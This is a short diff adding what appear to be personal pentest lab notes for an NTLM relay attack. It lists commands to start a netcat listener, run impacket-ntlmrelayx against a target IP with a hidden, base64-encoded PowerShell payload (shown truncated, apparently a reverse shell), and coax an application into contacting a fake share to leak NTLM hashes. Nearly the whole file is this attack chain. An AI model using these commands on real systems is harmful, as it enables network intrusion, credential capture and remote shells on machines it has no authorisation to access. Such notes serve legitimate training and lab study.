@@ -1,0 +1,13 @@
+
+# Write a Base64 powershell execution
+=====================================
+=====================================
+# Start NC on port:
+nc -vnlp 4445
+=====================================
+# Start Impacket-NTLMRelayX with the target IP:
+sudo impacket-ntlmrelayx --no-http-server -sm2support -t 192.168.228.242 -c "powershell -nop -w hidden -e JABjAGw...AA=="
+=====================================
+
+# If you have a application that can try to reach //IP or \\IP you can try to reach a non-existent share in order to get the NTLM:
+//192.168.45.250/sharezao
